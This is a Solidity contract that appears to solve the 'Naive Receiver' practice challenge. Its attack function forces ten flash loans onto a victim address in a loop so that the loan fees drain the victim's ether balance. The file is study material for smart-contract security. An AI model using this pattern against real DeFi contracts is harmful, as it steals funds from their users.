// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

// The contract we will use to attack.
contract AttackNaiveReceiver {
  NaiveReceiverLenderPool pool; // From NativeReceiverLenderPool contract.

  constructor(address payable _pool) {
    pool = NaiveReceiverLenderPool(_pool);
  }

  function attack(address victim) public {
    // Loop to drain balance.
    for (int i = 0; i < 10; i++) {
      pool.flashLoan(victim, 1 ether);
    }
  }
}
